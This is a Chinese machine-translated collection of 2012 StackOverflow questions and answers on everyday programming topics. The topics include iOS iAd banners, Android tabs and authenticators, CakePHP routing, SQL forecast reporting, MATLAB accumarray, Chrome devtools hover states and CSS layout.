# StackOverflow 问答 12392000-12392999

# ios - iAd 横幅视图最佳实践

> ID：12392000
> 
> 赞同：2
> 
> 时间：2012-09-12T15:49:44.957
> 
> 标签：ios, sdk, iad

Apple 文件在其 iAd 最佳实践部分中提到了这一点，

> 如果用户从带有横幅视图的内容屏幕导航到没有横幅视图的屏幕，并且您希望他们在该屏幕上停留很长时间，请从视图层次结构中删除横幅视图，设置它的代表为零并在转换到新的内容屏幕之前释放它。更一般地说，当横幅视图对用户不可见时，应避免将其保留在周围。

我想知道我该怎么做？我有一个带有 2 个选项卡的 tabBar 应用程序。当第一个标签不可见时，我想删除 iAd BannerView。并在它再次出现时将其加载回来。我正在使用 viewWillAppear 来加载添加。并尝试使用 viewWillDisappear 删除横幅。

我试图从这样的视图中删除bannerView，

```
 [[[self.view subviews] lastObject] removeFromSuperview]; 
```

然后在导航到选项卡 2 时将其删除。但是当我再次点击选项卡 1 时，横幅不再加载。

做这个的最好方式是什么？

这是 viewWillAppear 代码

```
-(void)viewWillAppear:(BOOL)animated
{

    ADBannerView *banner = [[ADBannerView alloc] initWithFrame:CGRectMake(0, 200, 0, 0)];
    banner.currentContentSizeIdentifier = ADBannerContentSizeIdentifierPortrait;
    banner.delegate = self;
    [self.view addSubview:banner];
    [banner release];
} 
```

# android - 使用 AuthenticatorActivity 作为应用程序登录

> ID：12392005
> 
> 赞同：0
> 
> 时间：2012-09-12T15:49:56.650
> 
> 标签：android, android-syncadapter, android-authenticator

我的应用需要同步适配器，因此需要进行一些身份验证才能将帐户添加到`Accounts & Sync`.

我遵循了示例同步适配器应用程序并设置了我的应用程序。例如，我现在可以在我的服务器上验证一个用户并将一个帐户添加到该`Accounts & Sync`部分。

`AuthenticatorActivity`问题是我更喜欢这种通过在我的应用程序中添加帐户的程序，以获得更好的用户体验。

到目前为止，我已经添加了`AuthenticatorActivity`我的应用程序启动时间。一旦身份验证成功，它就会启动`Accounts & Sync`设置部分，这会完全破坏应用程序的登录/注册体验。

我怎样才能停止这种行为（`Accounts & Sync`成功启动设置）并允许我的应用程序移动到我选择的下一个步骤？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T16:12:10.110

这是比较简单的程序：

确保而不是使用`startActivity`你使用`startActivityForResult`.

```
Intent intent = new Intent(this, ClassYouAreLaunching.class);
startActivityForResult(intent, 0); // 0 reflects the requestCode seen in onActivityResult 
```

然后，确保一旦从原始意图将意图发送回您，您就可以捕获意图。

```
onActivityResult(int requestCode, int resultCode, Intent intent) {

    if( resultCode == Activity.RESULT_CANCELED ) {

        finish();
    } else {
        // MAYBE        
        switch( requestCode ) {
            ...     

        }
    } 
```

}

# repository - Egit：我的文件在所有分支中都已更新

> ID：12392015
> 
> 赞同：0
> 
> 时间：2012-09-12T15:50:31.177
> 
> 标签：repository, egit

我在 Eclipse 中使用 EGit。我有一个带有工作目录和两个分支的本地存储库。我已经基于 master 分支创建了一个分支。我在“辅助”分支的文件夹中添加了一个文件夹和一个文件。当我切换到主分支时，我在另一个分支中创建的文件夹和文件显示在主分支和工作目录中。

我错过了什么？据我说，它不应该出现，只有当我将辅助分支推送到主分支时。

你能帮忙吗

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:02:45.400

在文件系统中创建某些东西（例如使用`mkdir`or `touch`）在 Git 中没有任何意义。提交变更集后，将创建一个新的 Commit 对象，并`HEAD`指向当前分支上的该提交（可能与默认的不同，`master`）。只要您不提交任何内容，Git 就不会跟踪您的文件系统对象（文件和目录）；相反，它们有效地浮动，所以当你`git checkout SOMETHING`最终得到新的（未跟踪的）对象或者可能是错误消息时。

# javascript - 用Javascript修改内部标签的CSS规则

> ID：12392030
> 
> 赞同：2
> 
> 时间：2012-09-12T15:51:11.303
> 
> 标签：javascript, css, tags

我有这样的事情：

-HTML-

```
<table>
<tr class="x" onMouseOver="light(this)">
  <td>
    <a href="x">Link</a>
  </td>
  <td>
    Text
  </td>
</tr>
</table> 
```

-CSS-

```
.x a{
  color: black;
} 
```

-Javascript-

```
function light(x){
  x.style.color="red";
} 
```

现在，该功能可以正常工作，但我的 a 标签不会改变他的颜色。有没有办法让Javascript修改CSS规则.xa的属性颜色？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T15:54:57.570

这应该可以解决问题

```
x.children[0].children[0].style.color="red"; 
```

您也可以在 CSS 中为链接定义`:hover`样式

```
a:hover {
    color: red;
} 
```

当您将鼠标悬停在链接上时，这将改变链接颜色（链接）。

```
.x:hover a { } 
```

当您将鼠标悬停在链接上时，将为链接应用样式`.x`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T15:57:23.263

这可能更合适：

```
.x:hover {color:red}
.x:hover a{color:red} 
```

当行悬停时，这将覆盖链接的颜色，从而使该`onMouseOver`功能变得不必要。

请注意，它在 IE6 中可能会失败，但就我个人而言，除了在该浏览器中制作链接之外，我从来没有遇到任何问题`:hover`......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T15:59:24.617

**[现场演示](http://jsfiddle.net/loktar/q7jLB/)**

这会将所有子链接更改为红色。

```
function light(x){
  var elems = x.getElementsByTagName("a");
    for(var i=0; i < elems.length;i++){
        elems[i].style.color="red";
    }
}​ 
```

尽管我强烈建议`:hover`像其他人提到的那样使用伪类。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:15:50.797

-HTML- 用 in 标记包装你的 tr ，并将你的事件属性`<table>`转换为小写。`onmouseover`

```
<table>
<tr class="x" onmouseover="light(this)">
  <td>
    <a href="x">Link</a>
  </td>
  <td>
    Text
  </td>
</tr>
</table> 
```

-Javascript- 更改您的 javascript 函数体以选择`a`标记

```
function light(x){
  x.getElementsByTagName("a")[0].style.color="red";
} 
```

# c# - 网页抓取 C#

> ID：12392031
> 
> 赞同：1
> 
> 时间：2012-09-12T15:51:12.363
> 
> 标签：c#, html, web-scraping

我正在尝试从需要登录的网站上进行网页抓取，我已经实现了这一目标并成功抓取了该网站。

我遇到的问题是，我试图抓取的值直到加载站点几秒钟后才会出现，我正在从 Siemens OZW772.04 控制器单元抓取，它必须获取摄氏度度，它需要几秒钟才能将它们全部加载。

所以在我抓取了网站之后，文本还可以，但是所有的值都是这样的

```
Datapoint   Value       
HN1 heat-in \n
---
 \n     \n

 \n 
 HN2 room-temp \n
 ---
 \n      \n

 \n 
```

其中 \n 是我需要的值。我已经尝试过让线程等待，但这似乎也不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T15:58:47.083

如果网页使用 javascript 加载或编辑 html，那么除非您像浏览器那样呈现页面（即使用浏览器），否则您将看不到这一点。您可以使用[WebKit 和 WebKit.NET 库](https://stackoverflow.com/questions/5636921/screen-scraping-web-page-after-delay)或[多种替代方案之一](https://stackoverflow.com/questions/10161413/headless-browser-for-c-sharp-net)。

# cakephp - Cakephp 路由没有给出正确的结果

> ID：12392033
> 
> 赞同：0
> 
> 时间：2012-09-12T15:51:13.750
> 
> 标签：cakephp

我正在使用 cakephp 1.3。这是我的问题：

我有一个名为“learns”的控制器和一个名为“classroom”的方法。

要访问课堂方法，我使用此链接：[http ://www.url.com/learns/classroom/15](http://www.url.com/learns/classroom/15)

我希望它是这样的：[http ://www.url.com/class/15](http://www.url.com/class/15)

这就是我设置路线的方式：

```
Router::connect('/:class/:id', array('controller' => 'learns', 'action' => 'classroom'), array('id' => '[0-9]+')); 
```

我真的不知道为什么它不起作用。我通读了文档，我只是从食谱中复制了这个解决方案..

我在这里先向您的帮助表示感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T23:21:37.677

我认为您的路由器声明没有任何问题。虽然我不确定你是否真的想要**/:class/:id**而不是“ **/class/:id** ”。看到不同？第 2 版中缺少冒号。

这告诉路由器任何以 /class/[an-id] 开头的请求都应该映射到您的规则。将其设置为 /:class 意味着您将参数传递给路由器。它可以是任何东西**/foo/15**或**/bar/15**并且这些参数将在您的**$this->params['class']**和**$this->params['id']**中可用。假设这条规则 -> **/ ：班级号**

在您的问题中，您说“我真的不知道为什么它不起作用”。请避免此类陈述，因为它没有说明实际问题。

而是告诉我们您期待什么？而你看到了什么？这是一个错误吗？还是警告？如果您完全看到其他内容，例如执行了不同的操作，则可能是由于路由器实际工作的事实。如果您有一条贪婪路线和一条正常路线，如下所示：

/users/* 和 /users/:id

任何请求都不会匹配第二个 url，因为 /users/* 是**贪婪**的，并且会将所有请求都给自己，除非第一个路由规则返回 false。

如果这是您的情况，我建议您阅读如何编写自定义路由类。总之，自定义路由类试图使贪婪的路由不那么贪婪。为了获得更好的解释，这里是 mark story 的一篇优秀文章：http: [//mark-story.com/posts/view/using-custom-route-classes-in-cakephp](http://mark-story.com/posts/view/using-custom-route-classes-in-cakephp)

cakephp 中的路由是最令人困惑的主题之一，可能需要一段时间才能理解它。食谱是你最好的朋友。阅读并重新阅读所有内容，直到您确定每个路由元素在路由规则中的作用。

# java - 为什么 java.net.URL 是最终的？

> ID：12392035
> 
> 赞同：7
> 
> 时间：2012-09-12T15:51:27.593
> 
> 标签：java

我想从[java.net.URL](http://docs.oracle.com/javase/6/docs/api/java/net/URL.html#URL%28java.lang.String,%20java.lang.String,%20int,%20java.lang.String%29)继承，但我不能，因为它是最终的。我得到错误：

```
cannot inherit from final java.net.URL 
```

为什么是最终的？

[为什么String 是最终](https://stackoverflow.com/questions/2068804/why-is-string-final-in-java)状态的问题的一些答案，JVM 依赖 String 因为它是一种非常基本的数据类型。我看不出这将如何应用于 URL 类型。

**更新**

许多答案和评论都给出了理由，为什么避免继承是一种好习惯。有些人甚至认为一切都应该是最终的。但实际情况有所不同。JDK 中的大多数类*都不*是最终类。**良好的实践是不应**从 java.net.URL 继承的一个原因。这甚至可能适用于 JDK 的任何类。但是当某些东西被定义为 final 时，**就**不能继承了。这仅适用于一些极少数的类，如 String 或 URL。

所以 URL 和所有其他非 final 类之间一定有一些不同。问题是：这个 URL 是最终的，有什么区别？

说我不应该关心这个问题，因为无论如何我都不应该继承，这不是问题的答案。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T15:53:47.260

它是最终的，特别是为了防止你扩展它。[然而它在内部工作](http://www.docjar.com/html/api/java/net/URL.java.html)，它不是为继承而设计的，所以作者阻止你这样做。

记住*有效的 Java：*

*   **第 17 项：** “设计和文件继承，否则禁止。”
*   **第 16 条：** “优先组合而不是继承。”

因此，不要扩展`URL`，而是**创建一个具有`URL`字段的类。**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T15:55:47.683

我的猜测是这是出于安全原因。如果一个方法需要 URL 对象作为参数，并且您可以扩展 URL 类以执行 URL 类不应该执行的操作，那么它可能存在安全问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T15:56:27.070

AFAIK URL 是 IETF RFC 标准的完整实现，因此预计您不会想要更改或扩展它。

# sql - 如何在报告中显示同一时期的实际值和预测值而不会变得愚蠢？

> ID：12392042
> 
> 赞同：2
> 
> 时间：2012-09-12T15:51:50.443
> 
> 标签：sql, sql-server, reporting, ssas

所以我有一个系统，用户可以预测到月底后的第 18 天。但是，在该月中，他们每天都在输入实际值。

所以说当前日期是 2012 年 9 月 12 日。我对这个月有 100 个单位的预测，并且我已经将 25 个单位的实际值输入到系统中。

由于尚未到 10 月 18 日，我将报告 9 月的预测数字为 100 台。但是，用户还希望能够看到他们迄今为止输入的 25 个单位。

我的报告中有两种度量，一种用于实际值，另一种用于预测。如果我允许 9 月的实际数据出现在报告中，那么我将显示 125 个单位的数字，这显然是不正确的，并且会使我的年度总数也不正确。

我考虑添加一个新的度量“Transient Actuals”，它只会在当月使用并且不会累积，但这似乎很疯狂！

我不认为这些技术真的很重要，但我使用的是 SQL Server 数据库，并且报告是一个 Analysis Services 多维数据集。

当然这一定是一个普遍的问题？

* * *

好的 - 我确实有一个架构，但它非常非常复杂，并且报告和数据库表之间有多个层。但是，我可以给您一个简单的 SQL 示例。

```
--Actuals and Forecast Tables
DECLARE @Actuals TABLE (
    [Month] INT,
    Value NUMERIC(19,2));
DECLARE @Forecast TABLE (
    [Month] INT,
    Value NUMERIC(19,2));

--Pretending we are in Month #3 put in some dummy data
INSERT INTO @Actuals VALUES (1, 100);
INSERT INTO @Actuals VALUES (2, 120);
INSERT INTO @Actuals VALUES (3, 10);
INSERT INTO @Forecast VALUES (1, 90);
INSERT INTO @Forecast VALUES (2, 90);
INSERT INTO @Forecast VALUES (3, 90);

--Calculate the latest actuals period (this would usually be time-based)
DECLARE @LatestActualsPeriod INT = 2;

--Now report the data to the user
SELECT
    [Month],
    'Actuals' AS Source,
    Value
FROM
    @Actuals
WHERE
    [Month] <= @LatestActualsPeriod
UNION ALL
SELECT
    [Month],
    'Forecast',
    Value
FROM
    @Forecast
WHERE
    [Month] > @LatestActualsPeriod; 
```

现在，结果将是一个包含以下数据的表：

```
Month    Source    Value
1        Actuals   100.00
2        Actuals   120.00
3        Forecast   90.00 
```

那么我应该把第 3 个月的 10.00 实际值放在哪里而不会使总数不正确并且仍然在某处显示同一个月的预测？

* * *

好的，多亏了杰里米，我想我有答案了......问题是我的报告中有这样的数据：

```
Row Labels  Actual   Forecast Total
2012    23.840  18.840  42.680
2012/Jan    3.580   0.000   3.580
2012/Feb    3.520   0.000   3.520
2012/Mar    4.000   0.000   4.000
2012/Apr    3.350   0.000   3.350
2012/May    3.440   0.000   3.440
2012/Jun    3.090   0.000   3.090
2012/Jul    2.860   0.000   2.860
2012/Aug    0.000   4.990   4.990
2012/Sep    0.000   3.500   3.500
2012/Oct    0.000   4.130   4.130
2012/Nov    0.000   2.710   2.710
2012/Dec    0.000   3.510   3.510
Grand Total 23.840  18.840  42.680 
```

这是一个 Analysis Services 多维数据集，因此我无法显示“90 个实际/10 个预测”之类的内容，每个单元格都必须包含一个数字。但是，我有另一个解决方案。如果我添加一个包含两个成员的新维度，我可以使用它来控制显示的内容。

所以新维度将有两个选择，“显示全部”或“显示相关”（我可能需要处理名称）。如果用户选择了“显示全部”成员，那么他们将看到系统保存的任何实际值和预测值。因此，这意味着它们的总数将毫无意义，因为它将包括截至并包括本月在内的几个月的预测和实际值，以及对未来几个月的预测。

但是，如果用户选择“显示相关”成员，那么他们将只能看到尚未完成的月份的实际数据和未来月份的预测（如上所示）。

这意味着每个报告都需要包含这个维度并强制用户选择其中一个成员，否则他们的数字将完全没有意义，因此这不是最优雅的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T18:48:14.180

我在这里做了一堆假设，但希望这在这里有用。我接受了您的查询，并向您展示了其他一些方法，如果我正确理解问题，我认为这些方法可以帮助您解决以更易于阅读的方式显示数据的问题。

在第一个示例中，我假设您始终将日期设置为月初。如果不是，那么它可能会变得有点棘手，或者您可以使用`DATEPART(MONTH, ...`它来使其工作类似，就好像您将其存储为`INT`. 我不是假设每个月都会有一个预测值或实际值。

在第二个示例中，为了方便起见，我假设您只想显示最近一个月的实际值和实际值。然后我假设您想要该月及以后的预测值和实际值（如果有）。我还假设在第二个查询中每个月都有一个预测值。

如果这些假设中的任何一个不正确，则可以进一步修改查询以处理该问题。

```
--Actuals and Forecast Tables
DECLARE @Actuals TABLE (
    [Month] DATE,
    Value NUMERIC(19,2));
DECLARE @Forecast TABLE (
    [Month] DATE,
    Value NUMERIC(19,2));

INSERT INTO @Actuals VALUES ('20120801', 100);
INSERT INTO @Actuals VALUES ('20120901', 120);
INSERT INTO @Actuals VALUES ('20121001', 10);
INSERT INTO @Forecast VALUES ('20120801', 90);
INSERT INTO @Forecast VALUES ('20120901', 90);
INSERT INTO @Forecast VALUES ('20121001', 90);

INSERT INTO @Actuals VALUES ('20121101', 50);
INSERT INTO @Forecast VALUES ('20121201', 90);
-- If you can't have an actuals record without a forcast record, remove all the ISNULL'ing except the first ISNULL on the [Actual/Forecast] line
-- and change to LEFT JOIN instead of FULL.
SELECT
    SUBSTRING(CONVERT(VARCHAR, ISNULL(F.[Month], A.[Month]), 103), 4, 999) [Report Month]
    , ISNULL(CAST(A.Value AS VARCHAR(20)), '-') + '/' + ISNULL(CAST(F.Value AS VARCHAR(20)), '-') [Actual/Forecast]
FROM
    @Forecast F
    FULL JOIN @Actuals A
        ON A.[Month] = F.[Month]
ORDER BY
    [Report Month]

DELETE @Actuals
WHERE [Month] = '20121101'
DELETE @Forecast
WHERE [Month] = '20121201'

DECLARE @LatestActualsPeriod DATE = (SELECT MAX([Month]) FROM @Actuals);

SELECT
    [Month] [Report Month]
    , CAST(A.Value AS VARCHAR(20)) + ' Actual' [Units]
FROM
    @Actuals A
WHERE
    A.[Month] < @LatestActualsPeriod

UNION

SELECT
    F.[Month] [Report Month]
    , ISNULL(CAST(A.Value AS VARCHAR(20)), '-') + '/' + CAST(F.Value AS VARCHAR(20)) + ' Actual/Forecasted'
FROM
    @Forecast F
    LEFT JOIN @Actuals A
        ON A.[Month] = F.[Month]
WHERE
    F.[Month] >= @LatestActualsPeriod 
```

PS：您在答案中添加了架构，但没有回复我要求的评论。如果我没有出于好奇再次回顾这个问题，我就不会知道你编辑了你的问题。

# android - 从 TabHost 中的 TabWidget 中移除 View 会导致布局保持不变？（安卓）

> ID：12392043
> 
> 赞同：1
> 
> 时间：2012-09-12T15:51:53.173
> 
> 标签：android, view, tabs, android-tabhost, tabwidget

只是为了澄清。我有一个 TabHost，在那个 tabhost 里面有 5 个标签。我正在玩tabhost，所以我试图关闭其中一个选项卡（即其中一个子视图）。问题是，即使它有效，选项卡下方的布局保持不变，即如果我在要关闭的选项卡中有一个 textview，并且在主选项卡中有一个按钮，当我用 textview 关闭选项卡时，选项卡确实消失了，但文本视图仍然存在。这是我用来关闭标签的代码：

```
 int vPos = mHost.getCurrentTab();
    TabWidget tWidget = mHost.getTabWidget();

    if (vPos != 0) {
        tWidget.setCurrentTab(0);
        tWidget.removeView(mHost.getTabWidget().getChildAt(vPos));

    } 
```

所以基本上它关闭选项卡，切换到另一个选项卡，但选项卡下方的布局保持完全相同。我知道人们希望我发布完整的代码，包括布局和诸如此类的东西，但这是一般的事情，它不考虑布局，它只考虑选项卡（如果我弄错了，请随时指出）。

也许我应该在视图上调用 invalidate() ，但无论我使子视图、选项卡小部件还是选项卡主机无效，这都不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T00:14:55.910

不幸的是，由于缺少 removeTab 功能，这是 TabWidget 内部的一个问题。当您从 TabWidget 调用 removeView 时，从没有选项卡概念的 ViewGroup 类调用 removeView。结果，您实际上只是删除了实际的选项卡，而下面的索引和布局不受影响。

一个过度的解决方法是调用 removeAllViews 并重新添加所有视图。

# wpf - wpf中的数据网格高度

> ID：12392045
> 
> 赞同：0
> 
> 时间：2012-09-12T15:51:54.893
> 
> 标签：wpf, vb.net, visual-studio-2010, wpf-controls, wpfdatagrid

我只希望我的 Datagrid 的高度是返回的行的高度。我不想要行下方的灰色空间。

请问我该如何解决？

谢谢

```
 <DataGrid AutoGenerateColumns="False" Grid.Row="5" Grid.RowSpan="8" IsReadOnly="True" AlternatingRowBackground="SteelBlue" AlternationCount="1" HorizontalContentAlignment="Center" ItemsSource="{Binding}" HorizontalAlignment="Center" Margin="6,17,0,11" Name="dgEmp" Width="1000"  >
            <DataGrid.Columns>
                <DataGridTextColumn Header="Employee Name"  Width="100" Binding="{Binding Path=EmpName}"  />
                <DataGridTextColumn Header="UID"  Width="100" Binding="{Binding Path=UID}" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:03:57.477

这段代码对我有用。

```
 <Grid Name="parent">
        <DataGrid VerticalAlignment="Top" MaxHeight="{Binding ElementName=parent,Path=Height}" Name="dg"/>
    </Grid> 
```

# php - 对二维数组进行排序 - PHP

> ID：12392047
> 
> 赞同：0
> 
> 时间：2012-09-12T15:52:00.507
> 
> 标签：php, arrays, sorting

我在 php 中有一个包含日期的二维数组：

```
$cal[$year][$month] = $event; 
```

数组的输出是：

```
Array ( [2012] => Array ( [6] => 10.92 [11] => 16.38 [8] => 1.3 [9] => 16.96 ) 
```

我想按年和月对数组进行排序。我该怎么做呢？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T15:55:48.180

你应该看看 array_multisort 函数，你可以在这里找到信息：http: [//php.net/manual/en/function.array-multisort.php](http://php.net/manual/en/function.array-multisort.php)

第二个例子是你要找的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:30:46.217

根据您的以下数组：

```
$cal[$year][$month] = $event; 
```

并考虑到`$year`and`$month`都是数字的（如果不是，只需转换它们）。

要按升序排序年份和月份，请执行以下操作：

```
ksort($cal); //sort years
foreach($cal as &$arr) {
   ksort($arr); //sort months
} 
```

如果您希望它按 DESCENDING 顺序排列，请执行以下操作：

```
krsort($cal); //sort years
foreach($cal as &$arr) {
   krsort($arr); //sort months
} 
```

如果你想要一个混合排序，你可以在这两个例子中互换`ksort()`和，比如年升序和月降序。`krsort()`

# css - 如何在 Chrome 开发工具中设置元素的：悬停状态并编辑孩子的样式

> ID：12392049
> 
> 赞同：8
> 
> 时间：2012-09-12T15:52:02.453
> 
> 标签：css, google-chrome, hover, google-chrome-devtools

假设我们有这种风格：

```
.parent .child { ... }

.parent:hover .child { ... } 
```

两个选择器都为子元素设置样式。

我想要的是编辑第二种样式。

1.  我在 Chrome 开发者工具中点击`.parent`并设置状态`:hover`
2.  单击一个`.child`元素以获取孩子的样式，但是...

当我点击`.child`父鼠标悬停时消失了（因为它现在设置为`.child`）。

^(虽然这在 Firebug 中有效，但我在 Chrome 中需要它......)

> 铬 21.0.1180.89 m

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-12T16:08:37.943

**更新**：Chrome 现在有以下新热点：

1.  右键单击子元素并选择检查元素
    *   *Chrome 将打开 Elements 视图并选择项目*

2.  在 Elements 视图中，右键单击父元素并选择“Force Element State ▶ :hover”
    ![截图](../Images/a219a8752818cdfd7c0bddd69e4451a0.png)

3.  再次在 Elements 视图中选择子元素。

* * *

*旧的、有效但令人讨厌的技术如下：*

用[这个 JSFiddle](http://jsfiddle.net/Tq5gJ/1/)测试：

1.  悬停子元素本身（也悬停父元素）。
2.  右键单击孩子。
3.  **使用键盘**（不是鼠标）将上下文菜单选择向下移动到“检查元素”并按下`Enter`
    *   *Hurrah，悬停的父级和选定的子级的 CSS 规则可用*
4.  编辑规则。*（您可以移动鼠标来执行此操作；该项目将被取消悬停，但其中的 CSS 规则`:hover`不会消失。）*
5.  将鼠标悬停在元素上以查看更改的规则生效。

请注意，如果您在步骤 3 中做错了（如果您使用鼠标），则必须先选择不同的元素，然后再重试。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-14T15:29:39.110

（铬 22）

在`Elements`面板中，右键单击`.parent`元素并`Force Element State > :hover`在上下文菜单中选择。瞧。

或者，您可以单击右侧窗格标题中的“指针在虚线矩形上”按钮，`Styles`然后选中/取消选中要强制在当前选定元素上的伪类。

现在可以在 DOM 树中的任何元素上强制元素状态，而不仅仅是当前选定的元素。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T15:59:14.093

当您打开开发工具并查看标题栏右侧的样式窗格时`Styles`，会出现一个加号按钮，您可以在其中添加自定义检查器样式表规则。这可能是您正在寻找的。

# linux - ftrace函数统计和oprofile的区别

> ID：12392050
> 
> 赞同：2
> 
> 时间：2012-09-12T15:52:09.227
> 
> 标签：linux, profiling, oprofile, ftrace

有人可以比较`ftrace`统计数据`oprofile`吗？我们观察到以下现象：

*   在网络性能测试期间启用，我们发现使用 ftrace profiler ( ) 对性能测试的影响很小（与未启用`oprofile`的情况相比），`oprofile``CONFIG_FUNCTION_PROFILER`
*   当我们启用分析器时，网络测试的性能下降了大约 90%。
*   有很多函数在`oprofile`report中采样的比较少，但是在ftrace profile的report中，执行起来需要很多时间（大部分都是`skb_alloc`and `skb_free`）。

如果您之前使用过这两种分析，请对它们的准确性提出建议？

# algorithm - 如何优化此索引算法

> ID：12392061
> 
> 赞同：13
> 
> 时间：2012-09-12T15:53:14.207
> 
> 标签：algorithm, matlab, indexing

## 我的问题

*   无论如何，我可以加快这个计算吗？
*   是否有更好的算法或实现可用于计算相同的值？

## 描述算法

我有一个复杂的索引问题，我正在努力以一种有效的方式解决。

目标是使用来自相同大小矩阵、和`w_prime`的值的组合来计算矩阵。`w``dY``dX`

的值`w_prime(i,j)`计算为`mean( w( indY & indX ) )`，其中`indY`和`indX`是 和 的索引`dY`，`dX`分别等于`i`和`j`。

这是 matlab 中计算算法的简单实现`w_prime`：

```
for i = 1:size(w_prime,1)
  indY = dY == i;
  for j = 1:size(w_prime,2)
    indX = dX == j; 
    w_prime(ind) = mean( w( indY & indX ) );
  end
end 
```

## 性能问题

在下面的示例情况下，此实现就足够了；但是，在我的实际用例`w`中，`dY`, `dX`are ~`3000x3000`和`w_prime`is ~ `60X900`。这意味着每个索引计算都发生在大约 900 万个元素上。不需要这种实现太慢而无法使用。此外，我需要运行此代码几十次。

## 示例计算

如果我想计算`w(1,1)`

*   `dY`找到等于 1的索引，另存为`indY`
*   `dX`找到等于 1的索引，另存为`indX`

![在此处输入图像描述](../Images/0dca7aaa9331b11b161599a2b4e19d73.png)

*   查找交集`indY`并`indX`另存为`ind`

![在此处输入图像描述](../Images/8385c2e8b02111b39a90fc0fe24aa542.png)

*   保存 `mean( w(ind) )` 到`w_prime(1,1)`

![在此处输入图像描述](../Images/71ebf66c4cfda4931b2b3d873d402287.png)

## 一般问题描述

我有一个由两个向量`X`和定义的设定点`T`，两者都是 1XN，其中 N 为 ~3000。此外，X 和 T 的值是分别受区间 (1 60) 和 (1 900) 限制的整数。

矩阵`dX`和`dT`是简单的距离矩阵，这意味着它们包含点之间的成对距离。即`dx(i,j)`相等`abs( x(i) - x(j) )`。

它们是使用以下方法计算的：`dx = pdist(x);`

该矩阵`w`可以被认为是一个权重矩阵，描述了一个点对另一个点的影响程度。

计算的目的是确定在维度和维度中`w_prime(a,b)`分隔的点的子集之间的平均权重。`a``X``b``T`

这可以表示如下：

![在此处输入图像描述](../Images/42aea55fc9d16910c54ba46da729cba1.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-12T16:37:01.967

使用[ACCUMARRAY](http://www.mathworks.com/help/matlab/ref/accumarray.html)很简单：

```
nx = max(dX(:));
ny = max(dY(:));

w_prime = accumarray([dX(:),dY(:)],w(:),[nx,ny],@mean,NaN) 
```

输出将是一个带有`nx`NaN的按`ny`大小排列的数组，只要没有相应的索引对。如果您确定始终会有完整的索引，则可以将上述计算简化为

```
w_prime = accumarray([dX(:),dY(:)],w(:),[],@mean) 
```

那么，accumarray 有什么作用呢？它查看 的行`[dX(:),dY(:)]`。每行给出该行所贡献的`(i,j)`坐标对。`w_prime`对于所有对`(1,1)`，它将函数 ( `@mean`) 应用于 中的相应条目`w(:)`，并将输出写入`w_prime(1,1)`.

# javascript - jQuery 不使用 .load 填充 div

> ID：12392068
> 
> 赞同：0
> 
> 时间：2012-09-12T15:53:53.560
> 
> 标签：javascript, jquery, html, ajax

我有一个 jQuery 脚本，我想从另一个页面获取类“内容”的内容并将其填充到 div“代码”中。我有以下代码：

```
<script type="text/javascript">
  $(document).ready(function() {
      $('#code1').load("http://git.kbiggs.org/mdwrapper/tree/mdwrapper .content");
  });
</script> 
```

但是我在控制台中得到的只是`[11:49:33.579] GET http://git.kbiggs.org/mdwrapper/tree/mdwrapper [HTTP/1.1 200 OK 46ms]`，并且我在页面中没有看到任何变化—— div 最终没有被填充。

我在这里做错了什么？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T15:58:15.837

我认为您不能简单地将页面加载到 div 中而不会出现跨域问题。这是一项安全措施，否则世界各地的人们都会将其他站点的内容加载到他们自己的站点中。

你可以通过

1.  使用 iframe
2.  在 PHP 中使用[cURL](http://php.net/manual/en/book.curl.php)提取页面并将其发送到您的页面。

# html - 位置固定的 div 与主要内容的 div 下的图像

> ID：12392071
> 
> 赞同：0
> 
> 时间：2012-09-12T15:54:00.930
> 
> 标签：html, css, position, z-index, css-position

我需要在固定位置创建一个 div，我将把图像和其余内容放在一个 div 下

我已经放入我的 CSS`header { margin-bottom: 310px; }` 以在空间下方创建一个空白，我的 img 将`div id="background"`位于下面固定的位置。

那么我创建了以下ID：

```
#background {
position:fixed;
width:100%;
height:100%;
top:130px;
left:0;
z-index: 1;
overflow:scroll; 
```

}

和

```
#content {
width:100%;
height:100%;
top:60px;
left:0;
z-index:2;
overflow:scroll; 
```

}

id背景应该是我的图像将放置在标题后面的空白区域中的div，id内容是我将拥有我的页面内容的div，它从顶部开始。

这里的页面： http: [//fiddle.jshell.net/CGJmE/4/](http://fiddle.jshell.net/CGJmE/4/)

我想要达到的效果就是这样：[http](http://tommywebdesigner.com/Home%20Page.html) ://tommywebdesigner.com/Home%20Page.html 但是使用 div 来获得更多的灵活性。我的问题是我无法在图像固定的位置正确插入我的 div id 背景。

我认为现阶段很简单，你会怎么做？

希望解释清楚

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:22:59.300

您需要使用 background-position: fixed

我已经在这个 jsfiddle 中向您展示了：http: [//fiddle.jshell.net/CGJmE/7/](http://fiddle.jshell.net/CGJmE/7/)

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:28:30.083

我不明白你为什么穿上`overflow: scroll`，`#background`它什么也没做，真的。
与`overflow:scroll`上的相同`#content`。这是多余的。
一般来说，我不太明白你的问题是什么：http: [//fiddle.jshell.net/CGJmE/6/](http://fiddle.jshell.net/CGJmE/6/)
我`<div id="background"><img/></div>`在你指出的地方添加了。
